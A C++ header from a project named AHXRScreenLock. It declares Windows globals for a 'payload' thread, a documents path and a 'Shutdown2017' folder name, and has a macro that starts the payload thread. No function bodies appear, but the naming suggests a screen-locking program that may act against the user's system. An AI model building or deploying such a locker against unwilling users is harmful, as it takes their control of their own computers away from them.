/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include							<Windows.h>
#include							<string>

#define								SHUTDOWN_FOLDER_NAME		"Shutdown2017"

extern HANDLE						h_payload;
extern DWORD						dw_payload;
extern bool							b_new_generated;
extern std::string					s_documents_path;
extern DWORD WINAPI					t_payload(LPVOID lpParameter);

#define START_PAYLOAD()				{h_payload = CreateThread(0, 0, t_payload, 0, 0, &dw_payload);}